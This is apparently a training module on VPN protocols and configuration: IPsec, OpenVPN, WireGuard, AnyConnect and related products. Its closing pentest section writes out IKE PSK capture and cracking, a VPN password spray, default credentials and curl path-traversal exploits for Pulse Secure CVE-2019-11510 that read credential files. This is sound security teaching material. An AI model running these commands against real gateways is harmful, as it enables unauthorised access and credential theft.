---
title: "Module 09 — VPNs & Remote Access"
tags: [networking, vpn, ipsec, openvpn, wireguard, anyconnect, remote-access, pentest, netgod]
module: 9
date: 2026-04-05
---

# Module 09 — VPNs & Remote Access

> [!info] Module Overview
> This module covers every VPN type in depth — from IPsec IKE phase negotiation at the packet level through OpenVPN certificate chains, WireGuard's modern cryptography, and enterprise VPN concentrators. Site-to-site vs remote access architectures, split tunnelling mechanics, cipher negotiation, and a comprehensive Pentest Lens covering the most reliably exploitable VPN misconfigurations found in real engagements.

---

## 1. VPN Types — Site-to-Site, Remote Access, Clientless

### What a VPN Does

A VPN (Virtual Private Network) creates an **encrypted tunnel** between two endpoints over an untrusted network (typically the internet). Traffic inside the tunnel is encrypted and encapsulated — eavesdroppers see only the outer IP headers, not the payload.

**Three use cases**:

**Site-to-Site VPN**:
```
[Office A LAN] ──── VPN Tunnel (internet) ──── [Office B LAN]
192.168.1.0/24        encrypted                 10.10.0.0/24

Both LANs can communicate as if directly connected.
VPN gateways handle encryption/decryption — end devices unaware of VPN.
```

**Remote Access VPN (Client-to-Site)**:
```
[Remote Worker Laptop] ──── VPN Tunnel (internet) ──── [Corporate VPN Gateway]
                                                                │
                                                        [Corporate LAN]

VPN client software on laptop creates tunnel.
Worker's traffic appears to originate from corporate network.
```

**Clientless VPN (SSL VPN)**:
```
[Remote Worker Browser] ──── HTTPS ──── [SSL VPN Portal]
                                              │
                                     [Internal Web Apps]

No client software required.
Access limited to web-based applications (HTTP proxied through portal).
Modern clients: thin client Java/ActiveX for non-HTTP access.
```

### Full Tunnel vs Split Tunnelling

**Full tunnel**: ALL client traffic goes through the VPN — including internet browsing. The corporate network is the client's internet gateway.
```
Client → VPN → Corporate Gateway → Internet
Client → VPN → Corporate Gateway → Internal Resources
```
- **Pros**: All traffic inspected by corporate security stack (proxy, IPS, DLP)
- **Cons**: Higher bandwidth load on VPN gateway, adds latency for internet browsing

**Split tunnelling**: Only traffic destined for corporate subnets goes through VPN. Internet traffic goes directly.
```
Client → VPN → Corporate Gateway → Internal Resources (10.0.0.0/8)
Client → direct internet → Public websites
```
- **Pros**: Better performance, lower VPN gateway load
- **Cons**: Corporate cannot inspect internet traffic — endpoint bypass possible

**Pentest significance**: Split tunnelling means a compromised VPN client can be used to pivot into the corporate network while maintaining direct internet connectivity — useful for C2 communication without routing through monitored corporate infrastructure.

---

## 2. IPsec — IKE Phase 1 and Phase 2, AH vs ESP, Tunnel vs Transport

### IPsec Overview

IPsec (Internet Protocol Security) is a suite of protocols that provides security at the IP layer:
- **Authentication**: Proves the identity of VPN peers
- **Confidentiality**: Encrypts packet contents
- **Integrity**: Ensures packets haven't been modified
- **Anti-replay**: Prevents replay attacks using sequence numbers

IPsec uses two sub-protocols for different functions:
- **IKE (Internet Key Exchange)**: Negotiates security parameters and exchanges keys
- **AH or ESP**: Carries the actual secured traffic

### AH vs ESP

**AH (Authentication Header)** — Protocol 51:
- Provides **authentication and integrity** only — no encryption
- Authenticates the **entire IP packet** including the outer IP header
- Problem: Authenticating the outer IP header breaks NAT (NAT changes IP addresses) — AH cannot be used through NAT
- Rarely used in practice

**ESP (Encapsulating Security Payload)** — Protocol 50:
- Provides **authentication, integrity, AND encryption**
- Authenticates everything after the outer IP header (does not cover outer IP — NAT compatible)
- This is what virtually all VPNs use

**Tunnel Mode vs Transport Mode**:

```
Original Packet: [IP Header | TCP | Data]

Transport Mode (ESP):
  [Original IP Header | ESP Header | TCP | Data | ESP Auth]
  ↑ Original IP header preserved — only payload encrypted
  Used for: host-to-host communication within a LAN (IPsec between servers)

Tunnel Mode (ESP):
  [New IP Header | ESP Header | Original IP Header | TCP | Data | ESP Auth]
  ↑ Entire original packet encapsulated — new outer IP header added
  Used for: site-to-site and remote access VPNs (original IPs hidden)
```

**VPN gateways always use Tunnel Mode** — the original packet (with internal source/destination IPs) is encapsulated inside a new packet addressed to the remote VPN gateway.

### IKE — Internet Key Exchange

IKE establishes the Security Associations (SAs) — agreements on what algorithms to use and what keys to use. IKEv1 has two phases; IKEv2 simplifies this significantly.

### IKEv1 — Phase 1 (ISAKMP SA)

Phase 1 establishes a secure channel (the ISAKMP SA) used to protect Phase 2 negotiations. Two modes:

**Main Mode** (6 messages — more secure, identity protected):
```
Initiator                                    Responder
    │                                             │
    │──── Message 1: SA proposal ────────────────>│
    │     Propose: encryption, hash, auth, DH group
    │     (e.g., AES-256, SHA-256, PSK, Group 14)
    │                                             │
    │<─── Message 2: SA proposal (chosen) ────────│
    │     Responder selects from proposals        │
    │                                             │
    │──── Message 3: KE + Nonce ─────────────────>│
    │     Diffie-Hellman public key (KE)          │
    │     Random nonce (Ni)                       │
    │                                             │
    │<─── Message 4: KE + Nonce ──────────────────│
    │     Responder's DH public key               │
    │     Responder's nonce (Nr)                  │
    │     [Both sides now derive SKEYID from DH]  │
    │                                             │
    │──── Message 5: Identity + Auth (encrypted) >│
    │     ID payload (IP address or FQDN)         │
    │     Auth payload (PSK hash or cert sig)     │
    │                                             │
    │<─── Message 6: Identity + Auth (encrypted) ─│
    │                                             │
    │═══════════ ISAKMP SA Established ═══════════│
```

**Aggressive Mode** (3 messages — faster but identity sent in cleartext):
```
Initiator → Responder: SA + KE + Nonce + ID (all in one, unencrypted)
Responder → Initiator: SA + KE + Nonce + ID + Auth (ID in cleartext)
Initiator → Responder: Auth

Faster but identity (username/hostname) revealed in cleartext
PSK hash transmitted early → capturable → offline dictionary attack
```

> [!danger] Aggressive Mode PSK Vulnerability
> In Aggressive Mode with Pre-Shared Key authentication, the PSK hash is transmitted before the encrypted channel is established. An attacker in a passive eavesdropping position can capture this hash and perform an offline dictionary attack. Aggressive Mode should be disabled; use Main Mode with certificates instead.

### IKEv1 — Phase 2 (IPsec SA / Quick Mode)

Phase 2 negotiates the actual IPsec SAs used to encrypt user traffic. Runs inside the Phase 1 encrypted channel.

```
Initiator                                    Responder
    │                                             │
    │──── Quick Mode Message 1 ──────────────────>│
    │     (inside ISAKMP SA encryption)          │
    │     New SA proposals for IPsec:            │
    │       Protocol: ESP                        │
    │       Encryption: AES-256-GCM              │
    │       Integrity: SHA-256                   │
    │     Nonce (Ni2), KE (optional — PFS)       │
    │     Traffic selectors (what traffic to protect)
    │       TS_i: 192.168.1.0/24 (local subnet)  │
    │       TS_r: 10.10.0.0/24 (remote subnet)   │
    │                                             │
    │<─── Quick Mode Message 2 ───────────────────│
    │     Chosen SA parameters                   │
    │     Nonce (Nr2), KE (optional)             │
    │     Traffic selectors confirmed            │
    │                                             │
    │──── Quick Mode Message 3 ──────────────────>│
    │     Acknowledgment                         │
    │                                             │
    │══════════ IPsec SA Established ═════════════│
    │  Two unidirectional SAs created:           │
    │  SA1: Initiator → Responder (SPI_1)        │
    │  SA2: Responder → Initiator (SPI_2)        │
```

**SPI (Security Parameters Index)**: A 32-bit value in the ESP/AH header that identifies which SA applies to an incoming packet. The receiver uses SPI + destination IP + protocol to look up the correct decryption key in its SAD (Security Association Database).

**Traffic Selectors**: Define which traffic is protected by this SA. Can be a single host, subnet, or any. Mismatched traffic selectors between peers are a common VPN misconfiguration.

### IKEv2 (RFC 7296 — Modern Standard)

IKEv2 simplifies IKEv1's complexity:
- **4 messages** (2 exchanges) to establish both ISAKMP-equivalent and IPsec SAs
- Built-in support for **MOBIKE** (mobility — client changes IP without dropping VPN)
- **EAP** authentication built-in (for remote access with username/password)
- **Dead Peer Detection (DPD)** standardised
- **Traffic Selector** negotiation improved
- Asymmetric authentication — initiator and responder can use different auth methods

```
IKE_SA_INIT exchange (unprotected):
  Initiator → Responder: SA proposals, KE, Nonce
  Responder → Initiator: SA chosen, KE, Nonce, (optional: COOKIE)

IKE_AUTH exchange (encrypted with keys from IKE_SA_INIT):
  Initiator → Responder: Identity, Auth, Traffic Selectors, child SA proposals
  Responder → Initiator: Identity, Auth, Traffic Selectors, child SA

Both IKE SA and first Child SA (IPsec SA) established in 4 messages total.
```

### IPsec Configuration — Cisco IOS (Site-to-Site IKEv2)

```cisco
! ─── CRYPTO PROPOSAL (IKEv2 algorithms) ──────────────────────────────────────
crypto ikev2 proposal SITE2SITE-PROPOSAL
 encryption aes-cbc-256
 integrity sha512
 group 20             ! DH Group 20 = 384-bit ECC (NIST P-384) — strong and fast

! ─── IKEv2 POLICY ────────────────────────────────────────────────────────────
crypto ikev2 policy SITE2SITE-POLICY
 proposal SITE2SITE-PROPOSAL

! ─── IKEv2 KEYRING (Pre-Shared Keys) ─────────────────────────────────────────
crypto ikev2 keyring SITE2SITE-KEYS
 peer REMOTE-OFFICE
  address 203.0.113.20       ! Remote VPN gateway IP
  pre-shared-key local  StrongPSK-LocalSite!
  pre-shared-key remote StrongPSK-RemoteSite!

! ─── IKEv2 PROFILE ────────────────────────────────────────────────────────────
crypto ikev2 profile SITE2SITE-PROFILE
 match identity remote address 203.0.113.20
 authentication local pre-share
 authentication remote pre-share
 keyring local SITE2SITE-KEYS

! ─── IPSEC TRANSFORM SET (ESP encryption + integrity) ─────────────────────────
crypto ipsec transform-set STRONG-TS esp-aes 256 esp-sha512-hmac
 mode tunnel              ! Default — explicitly set

! ─── IPSEC PROFILE (links transform set + IKEv2 profile) ─────────────────────
crypto ipsec profile SITE2SITE-IPSEC-PROFILE
 set transform-set STRONG-TS
 set ikev2-profile SITE2SITE-PROFILE
 set pfs group20          ! Perfect Forward Secrecy — new DH for each SA

! ─── TUNNEL INTERFACE ────────────────────────────────────────────────────────
interface Tunnel0
 ip address 172.16.0.1 255.255.255.252   ! Tunnel endpoint IP
 ip mtu 1400                              ! Reduce MTU for encapsulation overhead
 ip tcp adjust-mss 1360                  ! Prevent TCP fragmentation through tunnel
 tunnel source GigabitEthernet0/0        ! Our WAN interface
 tunnel destination 203.0.113.20         ! Remote VPN gateway
 tunnel mode ipsec ipv4
 tunnel protection ipsec profile SITE2SITE-IPSEC-PROFILE

! ─── ROUTING THROUGH TUNNEL ─────────────────────────────────────────────────
ip route 10.10.0.0 255.255.0.0 Tunnel0   ! Route remote subnet through tunnel

! ─── VERIFICATION ────────────────────────────────────────────────────────────
show crypto ikev2 sa                   ! IKEv2 SA status
show crypto ipsec sa                   ! IPsec SA status (SPI, bytes encrypted)
show crypto ikev2 session              ! Detailed session info
show interfaces Tunnel0                ! Tunnel interface stats
debug crypto ikev2                     ! Real-time IKE debugging (use carefully)
```

### IPsec MTU and Fragmentation

IPsec adds overhead to each packet:
- ESP Tunnel Mode: adds new IP header (20 bytes) + ESP header (8 bytes) + IV (16 bytes for AES) + ESP trailer + ICV (16 bytes for SHA-256) ≈ **~60–80 bytes overhead**
- Internet MTU: typically 1500 bytes
- Usable payload: ~1400–1420 bytes

```cisco
! Always set on tunnel interface:
ip mtu 1400               ! Outer packet fits in 1500-byte internet MTU
ip tcp adjust-mss 1360    ! Clamp TCP MSS to prevent fragmentation
```

---

## 3. SSL/TLS VPN vs IPsec — Tradeoffs

| Aspect | IPsec | SSL/TLS VPN |
|--------|-------|------------|
| OSI Layer | Layer 3 (Network) | Layer 4–7 (Transport/Application) |
| Transport | UDP 500, 4500 (NAT-T) | TCP 443 (HTTPS) |
| Firewall Traversal | Can be blocked (non-standard ports) | Rarely blocked (TCP 443) |
| Client requirement | VPN client software | Browser (clientless) or thin client |
| Traffic supported | All IP protocols | HTTP/S (clientless), all (full client) |
| Performance | Higher (kernel-level processing) | Lower (userspace SSL processing) |
| NAT traversal | Requires NAT-T (UDP encapsulation) | Native (runs over TCP/UDP) |
| Setup complexity | Higher | Lower |
| Split tunnelling | Configurable | Configurable |
| Enterprise use case | Site-to-site, legacy remote access | Modern remote access |

**NAT-T (NAT Traversal)**: IPsec AH cannot traverse NAT (breaks authentication). ESP can, but some NAT implementations break it. NAT-T encapsulates IPsec ESP inside UDP port 4500, allowing it to traverse PAT/NAT without issues.

```cisco
! Enable NAT traversal on Cisco (usually automatic with IKEv2)
crypto isakmp nat keepalive 30    ! IKEv1 NAT-T keepalives
! IKEv2 handles NAT-T automatically
```

---

## 4. OpenVPN — Configuration, Certificates, Tun vs Tap, Split Tunnelling

### OpenVPN Overview

OpenVPN is an open-source SSL/TLS VPN. It runs in **userspace** (not kernel), uses **OpenSSL** for cryptography, and encapsulates IP traffic inside TLS-encrypted UDP or TCP connections.

**Port**: UDP 1194 (default) or TCP 443 (to blend with HTTPS)

**Architecture**:
```
Client App (OpenVPN client)
    │
    │ TLS connection
    ▼
OpenVPN Server
    │
    │ Routes to internal network
    ▼
Corporate LAN
```

### PKI for OpenVPN — Certificate Structure

OpenVPN uses a PKI (Public Key Infrastructure) with:
- **CA (Certificate Authority)**: Signs all other certificates. The CA certificate is distributed to all clients.
- **Server Certificate**: Signed by CA. The OpenVPN server presents this to prove identity.
- **Client Certificates**: Each client has a unique certificate signed by the CA. Server validates these.

```bash
# ─── SETUP PKI WITH EASY-RSA ──────────────────────────────────────────────────
apt install easy-rsa

# Initialise PKI
make-cadir /etc/openvpn/easy-rsa
cd /etc/openvpn/easy-rsa
./easyrsa init-pki

# Create CA
./easyrsa build-ca nopass         # nopass = no CA key passphrase (for automation)
# Creates: pki/ca.crt (public), pki/private/ca.key (private — protect this)

# Create server certificate
./easyrsa gen-req server nopass
./easyrsa sign-req server server
# Creates: pki/issued/server.crt, pki/private/server.key

# Create client certificate
./easyrsa gen-req client01 nopass
./easyrsa sign-req client client01
# Creates: pki/issued/client01.crt, pki/private/client01.key

# Generate Diffie-Hellman parameters (for server)
./easyrsa gen-dh
# Creates: pki/dh.pem

# Generate TLS-Auth key (protects against DoS and pre-auth attacks)
openvpn --genkey secret /etc/openvpn/ta.key
```

### OpenVPN Server Configuration

```bash
# /etc/openvpn/server.conf

# ─── NETWORK ─────────────────────────────────────────────────────────────────
port 1194
proto udp                        # UDP preferred (TCP causes TCP-over-TCP issues)
dev tun                          # TUN device (Layer 3 — IP routing)
                                 # Use tap for Layer 2 bridging (rare)

# ─── CERTIFICATES ─────────────────────────────────────────────────────────────
ca   /etc/openvpn/easy-rsa/pki/ca.crt
cert /etc/openvpn/easy-rsa/pki/issued/server.crt
key  /etc/openvpn/easy-rsa/pki/private/server.key
dh   /etc/openvpn/easy-rsa/pki/dh.pem
tls-auth /etc/openvpn/ta.key 0  # 0 = server side

# ─── VPN SUBNET ───────────────────────────────────────────────────────────────
server 10.8.0.0 255.255.255.0    # VPN subnet (clients get IPs from this pool)
                                 # Server gets 10.8.0.1, clients get 10.8.0.2+

# ─── ROUTING — FULL TUNNEL (all client traffic through VPN) ──────────────────
push "redirect-gateway def1 bypass-dhcp"    # Override client default gateway
push "dhcp-option DNS 192.168.1.10"         # Push internal DNS server
push "dhcp-option DNS 8.8.8.8"             # Backup DNS

# ─── ROUTING — SPLIT TUNNEL (only internal subnets through VPN) ──────────────
# Comment out redirect-gateway, add:
push "route 192.168.1.0 255.255.255.0"     # Push route to internal LAN
push "route 10.0.0.0 255.0.0.0"           # Push route to entire 10.x.x.x range

# ─── CRYPTOGRAPHY ─────────────────────────────────────────────────────────────
tls-version-min 1.2              # Minimum TLS version
cipher AES-256-GCM               # Data channel cipher
auth SHA256                      # HMAC for data channel integrity (if not AEAD)
tls-cipher TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384  # Control channel cipher

# ─── SECURITY ─────────────────────────────────────────────────────────────────
tls-auth ta.key 0                # HMAC signature on control channel packets
                                 # Drops packets without valid HMAC before TLS
remote-cert-tls client           # Require client certs with clientAuth EKU
verify-client-cert require       # All clients must present valid certificate
user nobody                      # Drop privileges after start
group nogroup
chroot /etc/openvpn/chroot       # Chroot for isolation

# ─── PERFORMANCE ─────────────────────────────────────────────────────────────
keepalive 10 120                 # Ping every 10s, restart after 120s no response
compress lz4-v2                  # Compression (disable if security is priority)
push "compress lz4-v2"

# ─── LOGGING ──────────────────────────────────────────────────────────────────
status /var/log/openvpn/status.log 10    # Status file updated every 10s
log-append /var/log/openvpn/openvpn.log
verb 3                           # Verbosity (0=silent, 5=debug, 9=maximum)
mute 20                          # Suppress repeated messages

# ─── CLIENT MANAGEMENT ────────────────────────────────────────────────────────
client-config-dir /etc/openvpn/ccd      # Per-client config files
                                        # File named by client CN
# /etc/openvpn/ccd/client01:
# ifconfig-push 10.8.0.10 10.8.0.11    # Assign fixed IP to this client
# iroute 192.168.100.0 255.255.255.0   # This client can reach 192.168.100.0/24

management 127.0.0.1 7505       # Management interface (local only)
```

### OpenVPN Client Configuration

```bash
# client.ovpn (can be distributed as .ovpn file with embedded certs)

client
dev tun
proto udp
remote vpn.corp.com 1194       # VPN server address and port
remote vpn-backup.corp.com 1194 # Failover server
resolv-retry infinite
nobind
persist-key
persist-tun

# Inline certificates (embedded in .ovpn — convenient for distribution)
<ca>
-----BEGIN CERTIFICATE-----
[CA certificate content]
-----END CERTIFICATE-----
</ca>

<cert>
-----BEGIN CERTIFICATE-----
[Client certificate content]
-----END CERTIFICATE-----
</cert>

<key>
-----BEGIN PRIVATE KEY-----
[Client private key content]
-----END PRIVATE KEY-----
</key>

<tls-auth>
[TLS-Auth key content]
</tls-auth>
key-direction 1                # 1 = client side for tls-auth

cipher AES-256-GCM
auth SHA256
tls-version-min 1.2
remote-cert-tls server         # Verify server cert has serverAuth EKU
verify-x509-name vpn.corp.com name  # Verify server CN matches hostname
verb 3
```

### TUN vs TAP

| Feature | TUN (Layer 3) | TAP (Layer 2) |
|---------|--------------|--------------|
| Device type | Point-to-point | Ethernet |
| Layer | IP (Layer 3) | Ethernet (Layer 2) |
| Packets | IP packets | Ethernet frames |
| Use case | Standard VPN (routing) | Bridging (client gets same subnet as LAN) |
| Broadcast support | No | Yes |
| Performance | Better | Slightly lower (Ethernet header overhead) |
| Typical use | Remote access, site-to-site | Legacy apps requiring L2 adjacency |

**TAP use case example**: An application that requires broadcast discovery (old Windows file sharing, some VoIP systems) — TAP bridges the remote client into the same Ethernet segment as the office LAN.

---

## 5. WireGuard — Key Exchange, Config Syntax, Performance

### WireGuard Overview

WireGuard is a modern VPN protocol designed for simplicity, speed, and strong cryptography. It is built into the Linux kernel (since 5.6), making it significantly faster than OpenVPN (userspace) or IPsec (complex kernel implementation).

**Key design principles**:
- **Minimal attack surface**: ~4000 lines of code (vs OpenVPN ~100,000, IPsec even more)
- **Cryptographically opinionated**: No algorithm negotiation — one fixed set of algorithms
- **Stateless design**: Silent by default — does not respond to unauthenticated packets

**Cryptography (fixed — no negotiation)**:
- **Key exchange**: Curve25519 (ECDH)
- **Data encryption**: ChaCha20
- **Authentication**: Poly1305 (MAC)
- **Hashing**: BLAKE2s
- **Handshake**: Noise Protocol Framework (IKpsk2 pattern)

### WireGuard Key Exchange

```
WireGuard uses a 1.5 round-trip handshake (based on Noise IKpsk2):

Initiator                                    Responder
    │                                             │
    │──── Handshake Initiation ──────────────────>│
    │  Encrypted with:                            │
    │    - Responder's static public key          │
    │    - Ephemeral key pair (new per handshake) │
    │    - Optional pre-shared key (PSK)          │
    │  Contains:                                  │
    │    - Initiator's static public key (encrypted)
    │    - Timestamp (prevents replay)            │
    │                                             │
    │<─── Handshake Response ─────────────────────│
    │  Encrypted with session keys                │
    │  Contains:                                  │
    │    - Responder's ephemeral public key       │
    │    - Empty payload (confirmation)           │
    │                                             │
    │══════════ Data Transport ════════════════════│
    │  ChaCha20-Poly1305 encrypted                │
    │  Separate keys for each direction           │
```

**WireGuard identity = public key**: Each peer is identified by its Curve25519 public key — no certificates, no PKI, no CAs. Keys are 32 bytes (44 base64 characters).

**Roaming**: WireGuard endpoint (IP:port) is updated automatically on the server when it receives a valid packet from a new IP — the mobile client seamlessly roams between Wi-Fi and mobile networks.

### WireGuard Configuration — Server

```ini
# /etc/wireguard/wg0.conf — Server

[Interface]
# Server's private key
PrivateKey = <server-private-key-base64>

# Server's VPN tunnel address
Address = 10.0.0.1/24

# Port to listen on
ListenPort = 51820

# Firewall rules — run when interface comes up/down
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; \
         iptables -A FORWARD -o wg0 -j ACCEPT; \
         iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; \
           iptables -D FORWARD -o wg0 -j ACCEPT; \
           iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

# Also enable IP forwarding:
# echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf
# sysctl -p

# ─── PEER 1 (Remote worker laptop) ───────────────────────────────────────────
[Peer]
# Client's public key
PublicKey = <client1-public-key-base64>
# Optional pre-shared key (extra symmetric encryption layer)
PresharedKey = <psk-base64>
# VPN IP assigned to this client
AllowedIPs = 10.0.0.2/32

# ─── PEER 2 (Remote site gateway) ────────────────────────────────────────────
[Peer]
PublicKey = <site2-public-key-base64>
# Fixed endpoint for site-to-site (server initiates keepalive)
Endpoint = 203.0.113.50:51820
# Entire remote site subnet
AllowedIPs = 10.0.0.3/32, 192.168.100.0/24
# Keepalive (maintains NAT mappings for this peer)
PersistentKeepalive = 25
```

### WireGuard Configuration — Client

```ini
# /etc/wireguard/wg0.conf — Client (remote worker)

[Interface]
# Client's private key
PrivateKey = <client-private-key-base64>

# Client's VPN tunnel address
Address = 10.0.0.2/24

# DNS to use through VPN
DNS = 192.168.1.10

[Peer]
# Server's public key
PublicKey = <server-public-key-base64>
# Optional pre-shared key
PresharedKey = <psk-base64>
# Server's internet endpoint
Endpoint = vpn.corp.com:51820

# AllowedIPs = routing policy:
# Full tunnel (all traffic through VPN):
AllowedIPs = 0.0.0.0/0, ::/0

# Split tunnel (only corporate resources through VPN):
# AllowedIPs = 192.168.1.0/24, 10.0.0.0/8

# Keepalive (if behind NAT — maintains mapping)
PersistentKeepalive = 25
```

### WireGuard Key Generation and Management

```bash
# Generate key pair
wg genkey | tee privatekey | wg pubkey > publickey
cat privatekey    # Store securely — distribute publickey only

# Generate pre-shared key
wg genpsk > presharedkey

# Show WireGuard status
wg show                    # All interfaces
wg show wg0                # Specific interface
wg show wg0 latest-handshakes   # Last handshake time per peer
wg show wg0 transfer            # Bytes sent/received per peer

# Bring interface up/down
wg-quick up wg0
wg-quick down wg0

# Enable at boot (systemd)
systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# Add peer dynamically (without restarting)
wg set wg0 peer <public-key> allowed-ips 10.0.0.10/32 endpoint 1.2.3.4:51820
```

### WireGuard Performance

```bash
# Benchmark WireGuard throughput
# Server (iperf3 server through tunnel)
iperf3 -s -B 10.0.0.1

# Client
iperf3 -c 10.0.0.1 -t 30

# Typical results:
# WireGuard: 800–1000 Mbps on modern hardware (kernel implementation)
# OpenVPN (AES-NI): 400–600 Mbps
# IPsec: 800–1000 Mbps (kernel, AES-NI)
```

---

## 6. Enterprise VPN — Cisco AnyConnect, GlobalProtect, FortiClient

### Cisco AnyConnect (Cisco Secure Client)

AnyConnect is Cisco's SSL VPN client — the most widely deployed enterprise VPN client.

**Architecture**:
```
AnyConnect Client ──── TLS/DTLS ──── Cisco ASA / FTD (VPN Gateway)
                       TCP 443 (TLS)
                       UDP 443 (DTLS — faster, lower latency for data)
```

**DTLS (Datagram TLS)**: AnyConnect uses DTLS for data transfer — UDP-based TLS. The initial connection and authentication use TLS (TCP 443), then data switches to DTLS (UDP 443) for performance.

**Authentication methods**:
- Username + password (AD, LDAP, RADIUS)
- Certificate + password
- Certificate only
- MFA (RSA SecurID, Duo, TOTP via RADIUS)

```cisco
! Cisco ASA AnyConnect configuration

! ─── TRUSTPOINT (server certificate) ────────────────────────────────────────
crypto ca trustpoint CORP-CA
 enrollment url http://ca.corp.local/certsrv
 subject-name CN=asa01.corp.local,OU=IT,O=Corp,C=GB
 revocation-check crl

! ─── WEBVPN (enable SSL VPN) ─────────────────────────────────────────────────
webvpn
 enable outside                    ! Enable on outside (internet-facing) interface
 anyconnect enable                 ! Enable AnyConnect client downloads
 anyconnect image disk0:/anyconnect-win-4.10.pkg 1   ! Windows client
 anyconnect image disk0:/anyconnect-macos-4.10.pkg 2  ! macOS client
 anyconnect profiles CORP-VPN disk0:/corp-profile.xml
 tunnel-group-list enable          ! Show tunnel group dropdown

! ─── GROUP POLICY ────────────────────────────────────────────────────────────
group-policy REMOTE-USERS internal
group-policy REMOTE-USERS attributes
 vpn-tunnel-protocol ssl-client    ! AnyConnect SSL
 split-tunnel-policy tunnelspecified    ! Split tunnelling
 split-tunnel-network-list value SPLIT-ACL
 dns-server value 192.168.1.10 192.168.1.11
 default-domain value corp.local
 vpn-session-timeout 480           ! 8 hour session timeout
 vpn-idle-timeout 30               ! 30 minute idle timeout

! ─── SPLIT TUNNEL ACL ────────────────────────────────────────────────────────
access-list SPLIT-ACL standard permit 192.168.1.0 255.255.255.0
access-list SPLIT-ACL standard permit 10.0.0.0 255.0.0.0

! ─── TUNNEL GROUP ────────────────────────────────────────────────────────────
tunnel-group CORP-VPN type remote-access
tunnel-group CORP-VPN general-attributes
 address-pool VPN-POOL              ! IP pool for VPN clients
 authentication-server-group CORP-RADIUS    ! RADIUS for auth
 default-group-policy REMOTE-USERS
tunnel-group CORP-VPN webvpn-attributes
 group-alias "Corporate VPN" enable  ! Name shown in client dropdown

! ─── IP POOL ─────────────────────────────────────────────────────────────────
ip local pool VPN-POOL 172.16.100.1-172.16.100.254 mask 255.255.255.0

! ─── VERIFY ─────────────────────────────────────────────────────────────────
show vpn-sessiondb anyconnect       ! Active AnyConnect sessions
show vpn-sessiondb summary          ! Session summary
show webvpn statistics              ! Web VPN stats
```

### Palo Alto GlobalProtect

GlobalProtect is Palo Alto's VPN solution, integrated with the NGFW policy engine.

```
[GlobalProtect Client] ──── SSL/IPsec ──── [GlobalProtect Gateway (on Palo Alto)]
                                                    │
                                           [GlobalProtect Portal]
                                           (distributes config to clients)
```

**Portal**: Web server that authenticates users, provides client software, and distributes gateway configuration. Clients connect to portal first, download gateway list, then connect to assigned gateway.

**HIP (Host Information Profile)**: GlobalProtect checks device health before granting access:
- OS version and patch level
- Antivirus installed and updated
- Disk encryption enabled
- Firewall enabled
- Domain membership

**Key configuration elements**:
```
Portal: Authentication → Client Config → Gateway list → HIP profile
Gateway: Authentication → Tunnel Settings → IP pool → Split tunnelling → HIP policy
Security Policy: Source zone = VPN → Destination zone = Trust → User-ID → Application
```

### FortiClient (Fortinet)

FortiClient connects to FortiGate firewalls using SSL-VPN or IPsec.

```bash
# FortiClient common ports:
# SSL-VPN: TCP 443 (or custom port)
# IPsec: UDP 500, 4500

# FortiGate SSL-VPN config (CLI)
config vpn ssl settings
    set servercert "CORP-CERT"
    set tunnel-ip-pools "SSLVPN_TUNNEL_ADDR1"
    set dns-server1 192.168.1.10
    set dns-server2 192.168.1.11
    set port 443
    set source-interface "wan1"
end
```

---

## 7. VPN Misconfigurations Attackers Target

### Misconfiguration 1: Weak IKE Cipher Suites (IPsec)

Many organisations still support legacy cipher suites for compatibility with old equipment. This creates downgrade attack opportunities.

```bash
# Enumerate IKE proposals offered by a VPN gateway (IKEv1)
ike-scan 203.0.113.1                         # Default aggressive mode scan
ike-scan -M 203.0.113.1                      # Multi-line output
ike-scan --aggressive 203.0.113.1             # Aggressive mode probe

# Output reveals:
# Encryption: DES, 3DES, AES-128, AES-256
# Hash: MD5, SHA1, SHA256
# Auth: PSK, RSA
# DH Group: 1 (768-bit — broken), 2 (1024-bit — weak), 14 (2048-bit — acceptable)

# If DH Group 1 or 2 offered → Logjam attack (precomputed DH tables break 768/1024-bit DH)
# If DES/3DES offered → Sweet32 attack (birthday attack on 64-bit block cipher)
# If MD5 offered → deprecated hash algorithm

# nmap IKE scan
nmap -sU -p 500 --script ike-version 203.0.113.1
```

### Misconfiguration 2: IKEv1 Aggressive Mode with PSK

```bash
# Capture aggressive mode exchange to get PSK hash for offline cracking

# ike-scan with aggressive mode — triggers hash exchange
ike-scan --aggressive --id=vpnclient 203.0.113.1

# If server responds to aggressive mode:
# The PSK hash is transmitted in the clear → capture with Wireshark
# Filter: isakmp
# Look for SA payload + hash payload in Message 2 of aggressive mode exchange

# ikecrack — offline PSK brute force
ikecrack-snarf.pl capture.pcap > hashes.txt
ikecrack.pl -d /usr/share/wordlists/rockyou.txt hashes.txt

# Or use psk-crack (from ike-scan package)
psk-crack -d /usr/share/wordlists/rockyou.txt capture.pcap
```

### Misconfiguration 3: No MFA on Remote Access VPN

```bash
# Single-factor VPN (just username + password):
# Credential stuffing / password spray → VPN access

# Test if VPN uses only single-factor auth
# Attempt login with known-bad passwords (careful — account lockout)

# Password spray via AnyConnect (using pyotp/custom scripts)
# Tool: VPN Password Spray
python3 vpnspray.py --target 203.0.113.1 --userlist users.txt --password 'Summer2026!'

# Default credentials check:
# Cisco ASA local accounts: admin/admin, cisco/cisco
# Pulse Secure: admin/password, root/pulse123
# GlobalProtect: check for web interface at https://target/global-protect
```

### Misconfiguration 4: VPN Concentrator Web Interface Exposed

```bash
# Many VPN gateways expose web management on the same IP as the VPN
# ASA ASDM: https://203.0.113.1/admin — Java-based management
# Pulse Secure: https://203.0.113.1/ — web admin portal
# GlobalProtect: https://203.0.113.1/ — portal + gateway

# Enumerate VPN product from banner/headers
curl -I https://203.0.113.1/
nmap -sV -p 443 203.0.113.1

# Check for known vulnerabilities:
# Pulse Secure CVE-2019-11510 (pre-auth arbitrary file read → read password hash file)
# Fortinet CVE-2018-13379 (pre-auth arbitrary file read)
# Cisco ASA CVE-2020-3259 (pre-auth memory disclosure)

# Check Pulse Secure unauthenticated file read
curl -s "https://203.0.113.1/dana-na/../dana/html5acc/guacamole/../../../../../etc/passwd"
curl -s "https://203.0.113.1/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system"
# Returns session file with cached credentials if unpatched

# Shodan search for exposed VPN gateways
